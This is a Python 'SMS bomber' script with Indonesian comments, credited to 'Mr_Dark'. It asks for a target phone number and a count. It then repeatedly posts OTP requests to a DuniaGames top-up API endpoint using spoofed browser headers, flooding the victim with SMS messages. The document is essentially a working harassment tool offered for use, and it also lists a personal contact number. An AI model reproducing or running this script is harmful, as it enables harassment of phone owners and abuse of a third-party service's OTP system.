# Yang recode script ini sebelum subscribe channel MR_DARK, gw sumpahin lu ke alam ghoib ;v
# Udah subs?, scroll ke bawah























































import os,sys,time,requests,json,random
from requests import post
def anjay_alok():
    os.system('clear')
    print (" \033[1;36m╔═════════════════════════════════════════════╗")
    print (" ║  \033[31m███████\033[1;33m╗\033[31m██████\033[1;33m╗  \033[31m█████\033[1;33m╗ \033[31m███\033[1;33m╗   \033[31m███\033[1;33m╗       \033[1;36m ║")
    print (" ║  \033[31m\033[31m██\033[1;33m╔════╝\033[31m██\033[1;33m╔══\033[31m██\033[1;33m╗\033[31m██\033[1;33m╔══\033[31m██\033[1;33m╗\033[31m████\033[1;33m╗ \033[31m████\033[1;33m║   \033[1;36m     ║")
    print (" ║  \033[31m███████\033[1;33m╗\033[31m██████\033[1;33m╔╝\033[31m███████\033[1;33m║\033[31m██\033[1;33m╔\033[31m████\033[1;33m╔\033[31m██\033[1;33m║       \033[1;36m ║")
    print (" ║  \033[1;33m╚════\033[31m██\033[1;33m║\033[31m██\033[1;33m╔═══╝ \033[31m██\033[1;33m╔══\033[31m██\033[1;33m║\033[31m██\033[1;33m║\033[1;33m╚\033[31m██\033[1;33m╔╝\033[31m██\033[1;33m║\033[1;36m        ║")
    print (" ║  \033[31m\033[31m███████\033[1;33m║\033[31m██\033[1;33m║  \033[31m   ██\033[1;33m║\033[31m  ██\033[1;33m║\033[31m██\033[1;33m║ ╚═╝ \033[31m██\033[1;33m║    \033[1;36m    ║")
    print (" ║  \033[1;33m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[1;30m[\033[1;33mSMS\033[1;30m]  \033[1;36m║")
    print (" \033[1;36m║\033[1;33m---------------------------------------------\033[1;36m║")
    print (" \033[1;36m║\033[1;33m ➤ \033[1;37mAuthor \033[1;33m: \033[1;37mMr_Dark                          \033[1;36m║")
    print (" \033[1;36m║ \033[1;33m➤ \033[1;37mSpam Method \033[1;33m: \033[1;37mPOST                        \033[1;36m║")
    print (" \033[1;36m╚═════════════════════════════════════════════╝")
    print (" \033[1;30m<════════════[ \033[1;33m• INFORMATION \033[1;33m• \033[1;30m]══════════════>")
    print ("  \033[1;36m➤ \033[1;37mStatus Code \033[1;33m: \033[1;37mOPEN SOURCE \033[1;37m/ NOT ENCRYPTED")
    print ("  \033[1;36m➤ \033[1;37mApi Source \033[1;33m: \033[1;37mDuniaGames.co.id")
    print ("  \033[1;36m➤ \033[1;37minquiryId \033[1;33m: \033[1;37m219424679")
    print ("  \033[1;36m➤ \033[1;37mYoutube \033[1;33m: \033[1;37mMr_Dark")
    print (" \033[1;30m<═════════════════════════════════════════════>")
    print ("          \033[1;30m --=[ \033[1;33m• \033[1;37mTarget Phone \033[1;30m\033[1;33m• \033[1;30m]=--")
    print ("")
anjay_alok()
mr_dark1=input('  \033[31m➤ \033[1;37mTarget Phone Number \033[31m: ')
jumlah=int(input('  \033[31m➤ \033[1;37mJumlah Spam \033[31m: '))
print (" \033[1;30m<═════════════════════════════════════════════>")
mr_f={
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
subs_mr_dark = 1
# variable dark bisa di ganti sesuka kalian asalkan di bagian darko json= di ganti menjadi nama variable yang sama
# jika sms tidak masuk ganti inqueryId dengan value yang baru
# jika terjadi error wa gw ae: 082137268211
dark={
"phoneNumber":mr_dark1,
"inquiryId":219424679
}
# timer untuk per 1 spam adalah 60 second
def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'  \033[1;33m➤ \033[1;37mwaiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
        time.sleep(1)
        total_second -= 1


if __name__ == '__main__':
    for i in range(int(jumlah)):
        darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_f,json=dark).text
        print (f'  \033[31m➤ \033[1;37mTerkirim                            ')
        countdownTimer(00, 60)
        subs_mr_dark += 1
